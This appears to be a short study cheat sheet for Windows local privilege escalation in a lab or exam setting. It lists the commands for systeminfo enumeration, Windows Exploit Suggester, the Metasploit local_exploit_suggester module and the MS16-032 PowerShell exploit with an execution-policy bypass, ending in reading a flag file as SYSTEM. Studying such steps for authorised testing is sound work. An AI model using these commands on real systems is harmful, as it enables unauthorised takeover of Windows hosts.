### 1. Enumerate
```cmd
systeminfo > systeminfo.txt
```

### 2. Windows Exploit Suggester
```bash
sudo python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py \
  --database <updated.xls> \
  --systeminfo systeminfo.txt
```

**Filter results:**

- Ignore **DoS** exploits.
    
- Ignore exploits incompatible with target OS/architecture.
    
- Prioritize **LPE → SYSTEM**.
    
- `[E]` = ExploitDB PoC
    
- `[M]` = Metasploit module
    

### 3. Meterpreter Alternative

```text
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

### 4. MS16-032

**Secondary Logon Service LPE → SYSTEM**

PowerShell:

```powershell
Set-ExecutionPolicy bypass -scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

Verify:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

### Exam Flow

```text
systeminfo
   ↓
Windows Exploit Suggester
   ↓
Filter compatible LPEs
   ↓
Try MS16-032 / other valid exploit
   ↓
whoami → NT AUTHORITY\SYSTEM
   ↓
type C:\Users\Administrator\Desktop\flag.txt
```
